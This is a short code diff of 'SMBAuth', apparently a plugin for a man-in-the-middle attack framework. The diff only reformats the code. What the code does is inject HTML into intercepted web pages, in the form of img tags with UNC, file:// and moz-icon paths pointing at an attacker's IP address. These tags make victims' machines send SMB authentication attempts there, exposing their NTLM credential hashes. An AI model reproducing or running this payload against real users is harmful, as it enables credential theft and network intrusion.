@@ -1,4 +1,4 @@
-#!/usr/bin/env python2.7
+#!/usr/bin/env python
 
 # Copyright (c) 2014-2016 Marcello Salvati
 #
@@ -18,24 +18,25 @@
 # USA
 #
 
-from plugins.plugin import Plugin
 from plugins.inject import Inject
+from plugins.plugin import Plugin
+
 
 class SMBAuth(Inject, Plugin):
-    name     = "SMBAuth"
-    optname  = "smbauth"
-    desc     = "Evoke SMB challenge-response auth attempts"
-    version  = "0.1"
+	name = "SMBAuth"
+	optname = "smbauth"
+	desc = "Evoke SMB challenge-response auth attempts"
+	version = "0.1"
 
-    def initialize(self, options):
-        self.ip = options.ip
-        Inject.initialize(self, options)
-        self.html_payload = self._get_data()
+	def initialize(self, options):
+		self.ip = options.ip
+		Inject.initialize(self, options)
+		self.html_payload = self._get_data()
 
-    def _get_data(self):
-        return '<img src=\"\\\\%s\\image.jpg\">'\
-                '<img src=\"file://///%s\\image.jpg\">'\
-                '<img src=\"moz-icon:file:///%%5c/%s\\image.jpg\">' % tuple([self.ip]*3)
+	def _get_data(self):
+		return '<img src=\"\\\\%s\\image.jpg\">' \
+		       '<img src=\"file://///%s\\image.jpg\">' \
+		       '<img src=\"moz-icon:file:///%%5c/%s\\image.jpg\">' % tuple([self.ip] * 3)
 
-    def options(self, options):
-        pass
+	def options(self, options):
+		pass
